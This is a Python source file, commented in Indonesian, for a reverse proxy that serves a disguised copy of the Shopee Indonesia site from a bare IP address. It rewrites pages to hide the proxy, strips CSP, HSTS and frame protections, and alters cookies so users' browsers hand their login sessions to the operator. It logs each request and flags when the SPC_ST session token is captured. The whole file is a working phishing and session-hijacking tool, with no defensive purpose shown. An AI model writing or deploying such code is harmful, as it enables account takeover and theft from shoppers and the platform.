# -*- coding: utf-8 -*-
"""login_proxy2.py — reverse proxy dengan REWRITE TOTAL.

Fix dibanding login_proxy.py:
  1. Rewrite semua URL absolut shopee.co.id di HTML/JS/JSON -> path relatif
  2. Rewrite 43.156.19.172:8897 -> shopee.co.id di body
  3. Inject base tag & CSP override supaya SPA render
  4. Pass-through Set-Cookie dengan domain .shopee.co.id
"""
import http.server, socketserver, urllib.request, urllib.error, ssl, gzip, zlib
import io, json, time, os, re, sys

LISTEN_PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8896
UPSTREAM = "https://shopee.co.id"
TARGET_HOST = "shopee.co.id"
LOG = "/root/shopee-verify/loginproxy/access2.log"
HOST_SELF = f"43.156.19.172:{LISTEN_PORT}"

HOP = {"connection", "keep-alive", "proxy-authenticate", "proxy-authorization",
       "te", "trailers", "transfer-encoding", "upgrade", "content-length",
       "content-encoding", "host", "content-security-policy",
       "content-security-policy-report-only", "strict-transport-security",
       "x-frame-options"}

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE


def log(m):
    line = f"[{time.strftime('%H:%M:%S')}] {m}"
    print(line, flush=True)
    try:
        open(LOG, "a").write(line + "\n")
    except Exception:
        pass


def rewrite_body(data, ct):
    """Rewrite URL absolut jadi relatif supaya tidak terlihat IP/proxy."""
    if not data or len(data) > 3_000_000:
        return data
    if not any(x in (ct or "") for x in ("html", "javascript", "json", "text/plain")):
        return data
    try:
        s = data.decode("utf-8", "ignore")
    except Exception:
        return data

    orig = s
    # 1. shopee absolut -> relatif
    s = s.replace("https://shopee.co.id", "")
    s = s.replace("http://shopee.co.id", "")
    s = s.replace("//shopee.co.id", "")
    # 2. self host -> shopee
    s = s.replace(f"http://{HOST_SELF}", "https://shopee.co.id")
    s = s.replace(f"https://{HOST_SELF}", "https://shopee.co.id")
    s = s.replace(HOST_SELF, "shopee.co.id")
    # 3. inject base + security override di <head>
    if "html" in (ct or ""):
        inject = ('<base href="/">'
                  '<meta http-equiv="Content-Security-Policy" content="">')
        if "<head" in s.lower():
            s = re.sub(r'(<head[^>]*>)', r'\1' + inject, s, count=1, flags=re.I)
        else:
            s = inject + s
    if s != orig:
        return s.encode("utf-8")
    return data


class Proxy(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, *a):
        pass

    def _h(self, method):
        url = UPSTREAM + self.path
        n = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(n) if n else None

        hdrs = {}
        for k, v in self.headers.items():
            if k.lower() in HOP:
                continue
            if k.lower() in ("origin", "referer"):
                if HOST_SELF in v or "43.156.19.172" in v:
                    v = "https://shopee.co.id"
            hdrs[k] = v
        hdrs["Host"] = TARGET_HOST
        hdrs["Accept-Encoding"] = "gzip"

        log(f"{method} {self.path[:100]} b={len(body) if body else 0}")

        try:
            req = urllib.request.Request(url, data=body, method=method, headers=hdrs)
            op = urllib.request.build_opener(
                urllib.request.HTTPCookieProcessor(),
                urllib.request.HTTPSHandler(context=CTX))
            resp = op.open(req, timeout=50)
            code, rh, data = resp.status, dict(resp.headers.items()), resp.read()
        except urllib.error.HTTPError as e:
            code, rh, data = e.code, dict(e.headers.items()), e.read()
        except Exception as e:
            log(f"  ERR {str(e)[:70]}")
            self.send_error(502, "upstream")
            return

        enc = (rh.get("Content-Encoding") or "").lower()
        if enc == "gzip":
            try: data = gzip.decompress(data)
            except Exception: pass
        elif enc == "deflate":
            try: data = zlib.decompress(data)
            except Exception: pass

        ct = rh.get("Content-Type", "")
        data = rewrite_body(data, ct)

        # rewrite redirect
        loc = rh.get("Location")
        if loc:
            if "shopee.co.id" in loc:
                loc = loc.replace("https://shopee.co.id", "")
                loc = loc.replace("http://shopee.co.id", "")
            if HOST_SELF in loc:
                loc = loc.replace(HOST_SELF, "shopee.co.id")
            rh["Location"] = loc

        # cookie: hilangkan Domain supaya browser simpan untuk IP kita
        sc = rh.get("Set-Cookie")
        if sc:
            sc = re.sub(r';\s*[Dd]omain=[^;]*', '', sc)
            sc = re.sub(r';\s*[Ss]ecure', '', sc)
            sc = re.sub(r';\s*[Ss]ame[Ss]ite=[^;]*', '', sc)

        self.send_response(code)
        skip = {"content-length", "content-encoding", "connection",
                "transfer-encoding", "set-cookie", "location",
                "content-security-policy", "strict-transport-security",
                "x-frame-options"}
        for k, v in rh.items():
            if k.lower() in skip:
                continue
            self.send_header(k, v)
        if loc:
            self.send_header("Location", loc)
        if sc:
            self.send_header("Set-Cookie", sc)
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        try:
            self.wfile.write(data)
        except Exception:
            pass

        if "SPC_ST=" in str(sc or ""):
            log("  🟢🟢 SPC_ST DIDAPAT!")

    def do_GET(self): self._h("GET")
    def do_POST(self): self._h("POST")
    def do_PUT(self): self._h("PUT")
    def do_DELETE(self): self._h("DELETE")
    def do_HEAD(self): self._h("HEAD")
    def do_OPTIONS(self):
        self.send_response(204)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Headers", "*")
        self.send_header("Access-Control-Allow-Methods", "*")
        self.send_header("Content-Length", "0")
        self.end_headers()


class T(socketserver.ThreadingMixIn, socketserver.TCPServer):
    allow_reuse_address = True
    daemon_threads = True


if __name__ == "__main__":
    open(LOG, "w").close()
    log(f"START :{LISTEN_PORT}")
    T(("0.0.0.0", LISTEN_PORT), Proxy).serve_forever()
